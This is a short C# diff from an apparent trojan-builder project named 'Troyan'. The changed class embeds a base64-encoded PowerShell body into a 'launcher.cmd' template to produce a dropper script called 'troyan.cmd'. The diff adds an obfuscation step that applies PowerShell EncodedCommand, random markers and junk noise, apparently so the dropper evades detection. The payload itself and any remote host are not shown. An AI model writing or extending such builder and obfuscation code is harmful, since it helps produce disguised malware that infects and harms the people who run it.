@@ -2,9 +2,13 @@ using Commons;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>troyan.cmd</c> with standard base64 of plain <c>body.debug.ps1</c> (same drop path and run behavior as <see cref="TroyanPlainVbsEmitter"/>).</summary>
+/// <summary>Writes <c>troyan.cmd</c> with standard base64 of plain <c>body.debug.ps1</c>, then light-obfuscates (EncodedCommand, random markers, junk noise).</summary>
 public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
 {
+    private readonly ITroyanCmdObfuscator _obfuscator;
+
+    public TroyanPlainCmdEmitter(ITroyanCmdObfuscator obfuscator) => _obfuscator = obfuscator;
+
     public void Write(ServerLayoutPaths layout)
     {
         var templatePath = Path.Combine(layout.TroyanVbsDir, "launcher.cmd");
@@ -21,7 +25,7 @@ public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
         if (!template.Contains(placeholder, StringComparison.Ordinal))
             throw new InvalidOperationException("launcher.cmd must contain the 0102 placeholder.");
 
-        var cmd = template.Replace(placeholder, b64, StringComparison.Ordinal);
+        var cmd = _obfuscator.Obfuscate(template.Replace(placeholder, b64, StringComparison.Ordinal));
         var dir = Path.GetDirectoryName(layout.TroyanOutputCmd);
         if (!string.IsNullOrEmpty(dir))
             Directory.CreateDirectory(dir);
